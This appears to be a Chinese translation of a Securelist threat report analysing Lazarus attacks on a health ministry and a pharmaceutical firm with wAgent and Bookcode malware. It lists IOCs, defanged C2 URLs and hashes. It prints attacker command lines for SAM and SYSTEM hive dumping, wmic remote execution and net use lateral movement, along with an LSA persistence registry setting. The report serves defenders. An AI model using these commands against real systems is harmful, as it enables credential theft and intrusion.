随着COVID-19影响持续升级，攻击者正在试图通过任何手段加速疫苗研发。有证据表明，Lazarus正在通过攻击与COVID-19研究有关的实体来获取此类情报。他们在9月底攻击了一家制药公司和COVID-19有关的政府部门。

![1609895549_5ff50e7d67fda0de8ee49.png!small?1609895557606](https://image.3001.net/images/20210106/1609895549_5ff50e7d67fda0de8ee49.png!small?1609895557606)

本文会介绍两次攻击事件。

第一个是针对政府卫生部的攻击：2020年10月27日，卫生部的两台Windows服务器遭到破坏。攻击者在服务器上安装了复杂的恶意软件“wAgent”。它主要在内存中工作，并从远程服务器获取有效负载。

第二起事件涉及一家制药公司。这家公司在2020年9月25日被攻破。Lazarus通过一家韩国软件公司，在供应链攻击中部署了ESET先前报告的Bookcode恶意软件。

## wAgent恶意软件

恶意软件具有复杂的感染方案：

![1609895708_5ff50f1c8b48465e039a8.png!small?1609895708686](https://image.3001.net/images/20210106/1609895708_5ff50f1c8b48465e039a8.png!small?1609895708686)

目前无法获得此攻击中使用的启动模块。该模块使用特定参数执行wAgent。恶意软件是通过调用Thumbs
export函数直接从命令行在受害者机器上执行，参数为：

    
    
    c:\windows\system32\rundll32.exe  C:\Programdata\Oracle\javac.dat, Thumbs 8IZ-VU7-109-S2MY

16字节的字符串参数用作AES密钥来解密嵌入的负载—Windows
DLL。负载加载到内存中时，它使用给定的解密密钥对配置信息进行解密。配置包括C2服务器地址，以及文件路径。该配置指定了两个C2服务器，为同一个C2服务器。C2地址：

![1609895892_5ff50fd4d59dac2876251.png!small?1609895893124](https://image.3001.net/images/20210106/1609895892_5ff50fd4d59dac2876251.png!small?1609895893124)

恶意软件第一次被执行时，它会生成标识符，使用随机值的散列来区分每个受害者。它还生成一个16字节的随机值并反转，使用“@”作为分隔符与哈希值连接。例如，82UKx3vnjQ791PL2@29312663988969

恶意软件将生成的标识符编码为base64发送到C2。最后，代理从C2服务器获取有效负载，并将其直接加载到内存中。利用内存后门，恶意软件执行了许多shell命令来收集受害者信息：

    
    
    cmd.exe /c ping -n 1 -a 192.[redacted]
    cmd.exe /c ping -n 1 -a 192.[redacted]
    cmd.exe /c dir \\192.[redacted]\c$
    cmd.exe /c query user
    cmd.exe /c net user [redacted] /domain
    cmd.exe /c whoami

## wAgent持久控制

使用wAgent后门，攻击者安装了具有持久控制功能的wAgent有效负载。 提取此DLL后，使用以下命令：

    
    
    rundll32.exe c:\programdata\oracle\javac.io, SagePlug 4GO-R19-0TQ-HL2A c:\programdata\oracle\~TMP739.TMP

此wAgent安装程序的工作原理与上述wAgent
loader恶意软件类似。它负责在使用命令行中的16字节密钥解密后加载嵌入的有效负载。在解密的有效载荷中，恶意软件生成文件以继续感染，路径为：

    
    
    C:\Windows\system32\[random 2 characters]svc.drv

此文件伪装成名为SageThumbs Shell
Extension的合法工具。创建文件时，安装程序模块用随机数据填充它以增加它的大小。恶意软件还会复制创建时间，以使其不易被发现。

恶意软件将信息存储在第二个参数中（本例中为c:\programdata\oracle\~TMP739.TMP）。此日志文件包含时间戳和有关感染过程的信息，攻击者会使用Windows命令手动检查此文件。随后，恶意软件解密其嵌入的配置。此配置数据的结构与上述wAgent恶意软件类似。它还包含相同格式的C2地址：

    
    
    hxxps://iski.silogica[.]net/events/serial.jsp@WFRForms.jsp@import.jsp@view.jsp@cookie.jsp
    hxxp://sistema.celllab[.]com.br/webrun/Navbar/auth.jsp@cache.jsp@legacy.jsp@chooseIcon.jsp@customZoom.jsp
    
    hxxp://www.bytecortex.com[.]br/eletronicos/digital.jsp@exit.jsp@helpform.jsp@masks.jsp@Functions.jsp
    hxxps://sac.najatelecom.com[.]br/sac/Dados/ntlm.jsp@loading.jsp@access.jsp@local.jsp@default.jsp

恶意软件对配置数据进行加密，并将其存储为注册表项：

    
    
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Application\Emulate – [random 2 characters]svc

设置启动项：

    
    
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa – Security Packages : kerberos msv1_0 schannel wdigest tspkg pku2u [random 2 characters]svc.drv

最后启动[random 2个字符] svc.drv文件。 它搜索第一个svchost.exe进程并执行DLL注入。 注入的[random 2个字符]
svc.drv恶意软件包含用于解密和加载有效负载的恶意程序。 最终的有效负载是wAgent，它负责从C2中获取其他有效负载，并将其加载到内存中。

## Bookcode

Lazarus的Bookcode恶意软件主要针对制药公司正在开发的COVID-19疫苗。Lazarus用Bookcode恶意软件攻击韩国一家软件公司，目标可能是该公司的源代码或供应链。无法确定这起事件确切的初始感染媒介。

![1609896727_5ff51317588eed79eea5e.png!small?1609896737872](https://image.3001.net/images/20210106/1609896727_5ff51317588eed79eea5e.png!small?1609896737872)

尽管没有找到部署加载程序及其加密的Bookcode负载，但能够识别一个加载程序，此文件负责加载名为gmslogmgr.dat。解密有效负载后，加载程序找到主机使用winmgmt、ProfSvc或Appinfo参数，并将有效负载注入其中。

Bookcode恶意软件读取配置文件C_.NLS，此Bookcode示例的功能与韩国互联网安全局（KISA）最近发布报告中描述的恶意软件几乎相同。一旦恶意软件启动，它就会将受害者的信息发送到攻击者的基础设施。

### 感染阶段

Lazarus使用Bookcode的活动有其独特的TTP，在这次攻击中使用了相同的手法。

> 从注册表sam中提取受感染的主机信息，包括密码哈希
>
> 使用Windows命令检查网络连接
>
> 使用WakeMeOnLan工具扫描同一网络中的主机

安装Bookcode之后，恶意软件手机受害者系统和网络等信息：

    
    
    exe /c “reg.exe save hklm\sam %temp%\~reg_sam.save > “%temp%\BD54EA8118AF46.TMP~” 2>&1″
    exe /c “reg.exe save hklm\system %temp%\~reg_system.save > “%temp%\405A758FA9C3DD.TMP~” 2>&1″

横向移动阶段，恶意软件获取帐户信息后，使用“net”命令连接到另一个主机，并使用“wmic”命令执行复制的有效负载。

    
    
    exe /c “netstat -aon | find “ESTA” > %temp%\~431F.tmp
    exe /c “net use \\172.[redacted] “[redacted]” /u:[redacted] > %temp%\~D94.tmp” 2>&1″
    wmic /node:172.[redacted] /user:[redacted] /password:”[redacted]” process call create “%temp%\engtask.exe” > %temp%\~9DC9.tmp” 2>&1″

### 基础设施

C2服务器：

    
    
    hxxps://www.kne.co[.]kr/upload/Customer/BBS.asp
    hxxp://www.k-kiosk[.]com/bbs/notice_write.asp
    hxxps://www.gongim[.]com/board/ajax_Write.asp
    hxxp://www.cometnet[.]biz/framework/common/common.asp

其中一个C2服务器启用了目录列表：

![1609897197_5ff514ed5490ce6f576f7.png!small?1609897197401](https://image.3001.net/images/20210106/1609897197_5ff514ed5490ce6f576f7.png!small?1609897197401)

发现了几个日志文件和一个脚本，这是一个“第一阶段”C2服务器。它接收后门连接，充当到“第二阶段”服务器的代理。

Customer_Session.asp是第一阶段的C2脚本，负责传递命令，并获得命令执行结果。以下是为特定受害者发送数据过程：

![1609897321_5ff51569a0bde41bf0bb8.png!small?1609897322016](https://image.3001.net/images/20210106/1609897321_5ff51569a0bde41bf0bb8.png!small?1609897322016)

C2脚本还具有其他功能，例如更新下一阶段C2服务器地址、将植入的标识符发送到下一阶段服务器或删除日志文件。

![1609897397_5ff515b54b1a651debd57.png!small?1609897409743](https://image.3001.net/images/20210106/1609897397_5ff515b54b1a651debd57.png!small?1609897409743)

## 归属分析

根据之前的研究，这两起事件中使用的恶意软件归属于Lazarus。首先，针对卫生部使用的wAgent恶意软件与Lazarus先前在攻击加密货币业务时使用的恶意软件具有相同的感染方案。

> 两个案例都使用了类似的恶意软件命名方案，随机生成两个字符，并在其中添加“svc”生成有效负载植入的路径。
>
> 这两个恶意程序都使用Security Support Provider作为持久控制机制。
>
> 两个恶意程序的调试消息几乎相同。

以下是卫生部事件中使用的恶意软件与加密货币业务攻击中使用的恶意软件（4088946632e75498d9c478da782aa880）的比较：

![1609897582_5ff5166e3b63d2758f4b9.png!small?1609897601541](https://image.3001.net/images/20210106/1609897582_5ff5166e3b63d2758f4b9.png!small?1609897601541)

## IOC

### wAgent

    
    
    dc3c2663bd9a991e0fbec791c20cbf92 %programdata%\oracle\javac.dat
    
    26545f5abb70fc32ac62fdab6d0ea5b2%programdata%\oracle\javac.dat
    
    9c6ba9678ff986bcf858de18a3114ef3%programdata%\grouppolicy\Policy.DAT

### wAgent Installer

[4814b06d056950749d07be2c799e8dc2](https://opentip.kaspersky.com/4814b06d056950749d07be2c799e8dc2/?utm_source=SL&utm_medium=SL&utm_campaign=SL)%programdata%\oracle\javac.io,
%appdata%\ntuser.dat

### wAgent C2 servers

    
    
    http://client.livesistemas[.]com/Live/posto/system.jsp@public.jsp@jenkins.jsp@tomas.jsp@story.jsp
    
    hxxps://iski.silogica[.]net/events/serial.jsp@WFRForms.jsp@import.jsp@view.jsp@cookie.jsp
    
    hxxp://sistema.celllab[.]com.br/webrun/Navbar/auth.jsp@cache.jsp@legacy.jsp@chooseIcon.jsp@customZoom.jsp
    
    hxxp://www.bytecortex.com[.]br/eletronicos/digital.jsp@exit.jsp@helpform.jsp@masks.jsp@Functions.jsp
    
    hxxps://sac.najatelecom.com[.]br/sac/Dados/ntlm.jsp@loading.jsp@access.jsp@local.jsp@default.jsp

### wAgent file path

    
    
    %SystemRoot%\system32\[random 2 characters]svc.drv

### wAgent registry path

    
    
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Application\Emulate - [random 2 characters]svc

### Bookcode injector

    
    
    5983db89609d0d94c3bcc88c6342b354    %SystemRoot%\system32\scaccessservice.exe, rasprocservice.exe

### Bookcode file path

    
    
    %SystemRoot%\system32\C_28705.NLS
    
    %SystemRoot%\system32\gmslogmgr.dat

### Bookcode C2 servers

    
    
    hxxps://www.kne.co[.]kr/upload/Customer/BBS.asp
    
    hxxp://www.k-kiosk[.]com/bbs/notice_write.asp
    
    hxxps://www.gongim[.]com/board/ajax_Write.asp
    
    hxxp://www.cometnet[.]biz/framework/common/common.asp
    
    hxxps://www.locknlockmall[.]com/common/popup_left.asp

### MITRE ATT&CK

![1609897854_5ff5177e1f7add5076bf7.png!small?1609897854282](https://image.3001.net/images/20210106/1609897854_5ff5177e1f7add5076bf7.png!small?1609897854282)

## 原文链接

[securelist](https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/)

